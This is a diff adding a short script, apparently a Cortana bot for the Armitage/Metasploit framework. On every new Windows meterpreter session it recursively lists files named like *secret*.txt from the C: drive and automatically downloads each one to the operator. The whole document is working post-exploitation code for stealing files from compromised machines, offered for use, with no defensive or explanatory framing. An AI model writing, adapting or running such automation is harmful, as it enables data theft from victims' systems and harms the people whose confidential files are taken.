@@ -1,0 +1,21 @@
+# A bot the searches new Windows meterpreter sessions for interesting files 
+
+debug(7 | 34);
+
+on exec_dir {
+	local('$entry $host');
+	$host = session_host($1);
+	foreach $entry (split("\n", $3)) {
+		if ("*secret*.txt" iswm lc($entry)) {
+			say("Downloading: $entry from $host $+ / $+ $1");
+			m_download($1, $entry);
+		}
+	}
+}
+
+on session_sync {
+	if (-iswinmeterpreter $1) {
+		m_cmd($1, "cd c:\\");
+		m_exec($1, "dir /B /S *secret*.txt");
+	}
+}
